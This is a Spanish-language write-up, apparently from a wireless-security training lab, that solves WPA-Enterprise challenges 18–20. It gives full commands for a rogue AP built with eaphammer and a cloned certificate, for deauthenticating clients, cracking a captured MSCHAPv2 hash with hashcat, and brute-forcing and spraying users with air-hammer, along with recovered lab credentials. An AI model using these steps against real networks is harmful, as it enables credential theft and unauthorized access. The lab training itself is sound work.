# Challenges MGT

En este capítulo vamos a realizar los siguientes retos:

* Challenge 18 - ¿Cuál es la contraseña de Juan en wifi-corp?
* Challenge 19 - ¿Cuál es la contraseña de CONTOSO\test en wifi-corp?
* Challenge 20 - ¿Cuál es el usuario (con dominio) con contraseña 12345678 en wifi-corp?
* Challenge 21 - ¿Cuál es la flag en el AP wifi-regional-tablets?
* Challenge 22 - ¿Cuál es la flag en el AP wifi-regional?
* Challenge 23 - ¿Cuál es la contraseña del usuario vulnerable a RogueAP de wifi-global?
* Challenge 24 - ¿Cuál es la flag después de iniciar sesión en wifi-regional con las credenciales obtenidas en el paso anterior?
* Challenge 25 - ¿Cuál es la contraseña del Administrador de wifi-corp?
* Challenge 26 - ¿Cuál es la flag encontrada en el AP wifi-global?

***

## Challenge 18

* ¿Cuál es la contraseña de Juan en wifi-corp?

Para atacar una red MGT, hay que crear un AP falso, para esto hay que crear un certificado TLS para el AP usando `eaphammer`

Primero escaneamos la red en busca de "wifi-corp" y despues escaneando esta especifcamente

```
airodump-ng wlan0 --band bag -c 44 --bssid F0:9F:C2:71:22:1A -w /home/user/wifi/MGT/wifi-corp
```

<figure><img src="../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

> En este caso no hay ningun cliente conectado a la wifi de esta empresa, asi que se la haremos a otra wifi suya que si tenga clientes, en este caso "wifi-global"

```
airodump-ng wlan0 --band bag -c 44 --bssid F0:9F:C2:71:22:17 -w /home/user/wifi/MGT/wifi-global
```

<figure><img src="../../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

Ahora para sacar la info del certf de sesion de esta wifi, utilizamos `pcapFilter` -->

```
bash /root/tools/pcapFilter.sh -C -f /home/user/wifi/MGT/wifi-global-01.cap
```

<figure><img src="../../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

Ahora para general el certificado usamos `eaphammer` -->

```
python3 /root/tools/eaphammer/eaphammer --cert-wizard
```

<figure><img src="../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

Esto nos ira pidiendo información que deberemos ir cogiendo de la información del certificado sacado con `pcapFilter`&#x20;

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```
mv "WiFiChallenge CA-1.pem" /home/user/wifi/MGT/
```

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

> Esto sirve por si un usuario mira el certificado del AP, veo los campos en texto, no es obligatorio para el lab pero si recomendable en la vida real

Ahora que tenemos el certificado, levantamos el punto de acceso con `eaphammer`

```
python3 /root/tools/eaphammer/eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp
```

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Una vez que este el falso AP levantado, volvemos a monitorizar con `airodump-ng` el canal correspondiente (el 44) -->

```
airodump-ng wlan0 -c44
```

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Vemos que wifi-corp tiene dos APs y hay otro mas, que es el nuestro (el que termina en `44:00`, el rojo)

Para realizar el ataque, necesitamos hacer un `ataque de des autentificación` a ambos clientes, ejecutando `aireplay-ng`

```
## Cliente 6C:40 - Red 1
aireplay-ng -0 0 -a F0:9F:C2:71:22:1A -c 64:32:A8:07:6C:40 wlan0
## Cliente 6C:40 - Red 2
aireplay-ng -0 0 -a F0:9F:C2:71:22:15 -c 64:32:A8:07:6C:40 wlan0
```

> `-a` : BSSID del AP
>
> `-c` : MAC del cliente

<mark style="background-color:yellow;">Se lo tiramos al mismo cliente en ambas redes, para que asi, cuando se desconecte de una e intente ir a la otra que conoce, tambien se desconecte y por ultimo, vaya hacia la nuestra</mark>

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Vemos que el cliente se conecta y desconecta (ya que no tenemos su contraseña y no podemos continuar con la autentificación) pero tenemos un hash en `mschapv2`

Ahora lo guardamos en un archivo y utilizamos hashcat para romperlo -->

```
## Creamo fichero hash
nano juan.hash
## Content
juan.tr::::e85353c383224cb95be75727ad5f86bf9486335aa76b9070:8c1fe46f72a842f1
```

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Rompemos con `hashcat` -->

```
/root/tools/hashcat-6.0.0/hashcat.bin -a 0 -m 5500 juan.hash /root/rockyou-top100000.txt --force
```

> `mschapv2` es un cifrado duro y sera muy lento el crakeo

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

> Ahora en el caso de que cerremos la terminal y perdamos el hash, podemos volver a verlo en `/root/tools/eaphammer/logs/` (archivo `hostapd-eaphammer.log`)

Teniendo su contraseña en texto claro, nos conectamos con `wpa_supplicant` y pedir IP con `dhclietnt`

<pre class="language-bash"><code class="lang-bash">## Creamos el fichero
nano juan-corp.conf
## Content
<strong>network={
</strong><strong>        ssid="wifi-corp"
</strong><strong>        scan_ssid=1
</strong><strong>        key_mgmt=WPA-EAP
</strong><strong>        eap=PEAP
</strong><strong>        anonymous_identity="CONTOSO\anonymous"
</strong><strong>        identity="CONTOSO\juan.tr"
</strong><strong>        password="bulldogs1234"
</strong><strong>        phase1="peapver=1"
</strong><strong>        phase2="auth=MSCHAPV2"
</strong><strong>}
</strong><strong>## Conectamos wpa_supplicant
</strong><strong>wpa_supplicant -i wlan1 -c juan-corp.conf
</strong><strong>## Pedimos IP
</strong><strong>dhclient -v wlan1
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Y ahora apuntamos dede el navegador a la puerta de enlace `6.1`

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Tenemos credenciales -->

`CONTOSO\juan.jr:bulldogs1234`

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 19&#x20;

* ¿Cuál es la contraseña de CONTOSO\test en wifi-corp?

Para este ataque tenemos que usar fuerza bruta con `air-hammer`, creando un fichero con el nombre del usuario y ejecutando -->

```
## Añadimos el user
echo 'CONTOSO\test' > test.user
## Attack
/root/tools/air-hammer/air-hammer.py -i wlan1 -e wifi-corp -p /root/rockyou-top100000.txt -u test.user
```

> `-i` : Interfaz en SIN modo monitor
>
> `-e` : nombre del AP
>
> `-p` : diccionario
>
> `-u` : user name / domain

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Tenemos la contraseña del usuario test del dominio, asi que nos conectamos con `wpa_supplicant`

```bash
## Creamos el fichero
nano test-corp.conf
## Content
network={
        ssid="wifi-corp"
        scan_ssid=1
        key_mgmt=WPA-EAP
        eap=PEAP
        anonymous_identity="CONTOSO\anonymous"
        identity="CONTOSO\test"
        password="monkey"
        phase1="peapver=1"
        phase2="auth=MSCHAPV2"
}
## Conectamos wpa_supplicant
wpa_supplicant -i wlan1 -c test-corp.conf
## Pedimos IP
dhclient -v wlan1
```

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 20

* ¿Cuál es el usuario (con dominio) con contraseña 12345678 en wifi-corp?

Es muy parecido al anterior, solo que en vez de una lista de contraseñas, es un diccionario de usuarios

```
cat /root/top-usernames-shortlist.txt
```

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Tambien sabiendo que estamos en el domino `CONTOSO,` debemos añadir el prefijo delante de los usuarios -->

```
cat /root/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > /home/user/wifi/MGT/top-users-CONTOSO.txt
```

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Ahora utilizamos de nuevo `air-hammer` con la contraseña que nos han dado y este fichero -->

```
/root/tools/air-hammer/air-hammer.py -i wlan1 -e wifi-corp -P 12345678 -u /home/user/wifi/MGT/top-users-CONTOSO.txt 
```

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Y teniendo el usuario y contraseña, volvemos a conectarnos a la red -->

```
## Creamos el fichero
nano ftp-corp.conf
## Content
network={
        ssid="wifi-corp"
        scan_ssid=1
        key_mgmt=WPA-EAP
        eap=PEAP
        anonymous_identity="CONTOSO\anonymous"
        identity="CONTOSO\ftp"
        password="12345678"
        phase1="peapver=1"
        phase2="auth=MSCHAPV2"
}
## Conectamos wpa_supplicant
wpa_supplicant -i wlan1 -c ftp-corp.conf
## Pedimos IP
dhclient -v wlan1
```

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
